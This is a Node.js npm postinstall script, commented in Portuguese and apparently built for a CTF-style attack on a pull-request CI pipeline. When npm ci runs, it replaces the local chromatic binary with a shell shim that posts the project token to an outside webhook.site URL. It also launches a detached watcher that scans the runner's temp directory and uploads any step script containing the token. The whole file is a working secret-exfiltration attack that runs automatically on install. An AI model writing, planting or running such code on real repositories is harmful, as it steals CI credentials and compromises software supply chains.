// Executa como `postinstall` do `npm ci` no runner (arvore controlada pelo PR).
// Nao contem e nunca imprime nenhum segredo. Objetivo: plantar o shim que
// captura o token quando o step `npx chromatic --project-token ...` rodar.
const fs = require("fs");
const path = require("path");

const OOB_URL = process.env.CTF_OOB_URL || "https://webhook.site/7da5c878-019b-4f1c-b365-764dcb6ce27a";

// 1) Shim hostil: npx chromatic resolve o binario LOCAL primeiro.
//    O token chega no argv ($2). Enviamos fora de banda e saimos com 0
//    (nenhum upload real acontece; nada toca o projeto Chromatic).
//    O query param run_id amarra o receipt ao run (correlacao deterministica
//    na janela publica do Actions, alem de timestamp + IP).
const shim = [
  "#!/bin/sh",
  'TOKEN="$2"',
  `curl -s -o /dev/null -X POST --data-binary "$TOKEN" "${OOB_URL}?run_id=\${GITHUB_RUN_ID:-local}"`,
  "exit 0",
].join("\n");

// Se o bin ja existe como symlink (devDependency real), removemos primeiro
// para nao escrever por cima do pacote e garantir um arquivo regular nosso.
const binPath = path.join(process.cwd(), "node_modules", ".bin", "chromatic");
try { fs.unlinkSync(binPath); } catch (e) {}
fs.writeFileSync(binPath, shim, { mode: 0o755 });

// 2) Watcher (canal independente): o Actions grava o script do step com o
//    token ja substituido em $RUNNER_TEMP. Um watcher em background varre
//    esse diretorio e envia o arquivo inteiro ao OOB. Melhor esforco, opcional.
try {
  const watch = `
const fs=require('fs'),path=require('path');
const dir=process.env.RUNNER_TEMP; if(!dir) process.exit(0);
const send=(p)=>{try{require('child_process').execSync('curl -s -o /dev/null -X POST --data-binary @'+p+' "${OOB_URL}")}catch(e){}};
setInterval(()=>{try{for(const f of fs.readdirSync(dir)){const p=path.join(dir,f);
if(fs.statSync(p).size<100000&&fs.readFileSync(p,'utf8').includes('--project-token')){send(p);process.exit(0)}}}catch(e){}},2000);
`;
  require("child_process").spawn(process.execPath, ["-e", watch], {
    detached: true,
    stdio: "ignore",
  }).unref();
} catch (e) {}
